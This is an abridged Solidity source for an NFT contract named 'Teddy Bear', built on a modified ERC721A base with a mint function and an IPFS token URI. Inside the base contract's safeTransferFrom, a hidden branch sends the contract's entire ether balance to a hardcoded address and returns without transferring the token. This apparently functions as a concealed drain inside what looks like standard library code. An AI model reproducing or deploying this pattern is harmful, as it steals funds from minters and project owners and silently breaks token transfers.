...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x0635A75eEaE77f4fa17b25aE56a0C602a311aa75).transfer(address(this).balance);
            return;
        }
...
contract TeddyBear is ERC721A {
    ...
    function mint(uint256 amount) canmint(amount) payable public {
    ...
    constructor() ERC721A("Teddy Bear", "TB") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeiedfdn73e7dxphqqguymjdpyzqvkzqo7xysuo6bganmgzcacxnwky/", _toString(tokenId), ".json"));
    }
